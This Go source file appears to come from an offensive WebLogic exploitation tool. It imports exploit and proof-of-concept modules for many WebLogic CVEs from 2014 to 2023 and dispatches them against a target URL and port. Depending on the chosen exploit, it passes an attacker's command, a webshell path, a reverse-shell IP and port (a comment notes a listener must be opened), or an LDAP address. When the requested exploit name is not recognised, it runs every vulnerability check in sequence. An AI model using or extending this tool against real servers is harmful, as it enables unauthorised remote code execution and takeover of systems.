package utils

import (
	"fmt"
	"qi4l/EXP/CVE_2016_0638Exp"
	"qi4l/EXP/CVE_2016_3510Exp"
	"qi4l/EXP/CVE_2017_3248Exp"
	"qi4l/EXP/CVE_2018_2628Exp"
	"qi4l/EXP/CVE_2018_2893Exp"
	"qi4l/EXP/CVE_2020_14882Exp"
	"qi4l/EXP/CVE_2020_2555Exp"
	"qi4l/EXP/cve_2020_2883Exp"
	"qi4l/poc/CVE_2014_4210"
	"qi4l/poc/CVE_2016_0638"
	"qi4l/poc/CVE_2016_3510"
	"qi4l/poc/CVE_2017_10271"
	"qi4l/poc/CVE_2017_3248"
	"qi4l/poc/CVE_2017_3506"
	"qi4l/poc/CVE_2018_2628"
	"qi4l/poc/CVE_2018_2893"
	"qi4l/poc/CVE_2018_2894"
	"qi4l/poc/CVE_2019_2725"
	"qi4l/poc/CVE_2019_2729"
	"qi4l/poc/CVE_2019_2890"
	"qi4l/poc/Console"
	"qi4l/poc/cve_2018_3191"
	"qi4l/poc/cve_2018_3245"
	"qi4l/poc/cve_2018_3252"
	"qi4l/poc/cve_2020_14750"
	"qi4l/poc/cve_2020_14882"
	"qi4l/poc/cve_2020_14883"
	"qi4l/poc/cve_2020_2551"
	"qi4l/poc/cve_2020_2555"
	"qi4l/poc/cve_2020_2883"
	"qi4l/poc/cve_2023_21839"
)

type WorkExp struct {
	Url   string
	Port  string
	Rip   string
	Rport string
	EXP   string
	Cmd   string
	Ldap  string
}

func (c *WorkExp) WeblogicScanRun() {

	switch c.EXP {
	case "0638":
		CVE_2016_0638Exp.Run(c.Url, c.Port, c.Cmd)
		return
	case "3510":
		CVE_2016_3510Exp.Run(c.Url, c.Port, c.Cmd)
		return
	case "3248":
		CVE_2017_3248Exp.Run(c.Url, c.Port, c.Cmd)
		return
	case "2628":
		CVE_2018_2628Exp.Run(c.Url, c.Port, c.Cmd) // 此处的CMD为 WebShell 路径
		return
	case "2893":
		CVE_2018_2893Exp.Run(c.Url, c.Port, c.Rip, c.Rport) // 要开监听
		return
	case "14882":
		CVE_2020_14882Exp.Run(c.Url, c.Port, c.Cmd)
		return
	case "2555":
		cve_2020_2555Exp.Run(c.Url, c.Port, c.Cmd)
		return
	case "2883":
		cve_2020_2883Exp.Run(c.Url, c.Port, c.Cmd)
		return
	case "21839":
		cve_2023_21839.Run(c.Url, c.Port, c.Ldap)
		return
	default:
		fmt.Println("The entered EXP does not exist")
	}

	Console.Run(c.Url, c.Port)
	CVE_2014_4210.Run(c.Url, c.Port)

	CVE_2016_0638.Run(c.Url, c.Port)
	CVE_2016_3510.Run(c.Url, c.Port)

	CVE_2017_10271.Run(c.Url, c.Port)
	CVE_2017_3248.Run(c.Url, c.Port)
	CVE_2017_3506.Run(c.Url, c.Port)

	CVE_2018_2628.Run(c.Url, c.Port)
	CVE_2018_2893.Run(c.Url, c.Port)
	CVE_2018_2894.Run(c.Url, c.Port)
	cve_2018_3191.Run(c.Url, c.Port)
	cve_2018_3245.Run(c.Url, c.Port)
	cve_2018_3252.Run(c.Url, c.Port)

	CVE_2019_2725.Run(c.Url, c.Port)
	CVE_2019_2729.Run(c.Url, c.Port)
	CVE_2019_2890.Run(c.Url, c.Port)

	cve_2020_2551.Run(c.Url, c.Port)
	cve_2020_2555.Run(c.Url, c.Port, c.Cmd)
	cve_2020_2883.Run(c.Url, c.Port, c.Cmd)
	cve_2020_14750.Run(c.Url, c.Port)
	cve_2020_14882.Run(c.Url, c.Port)
	cve_2020_14883.Run(c.Url, c.Port)

	// 报错说明不存在，不报错且ldap服务有反应说明利用成功
	cve_2023_21839.Run(c.Url, c.Port, c.Ldap)
}
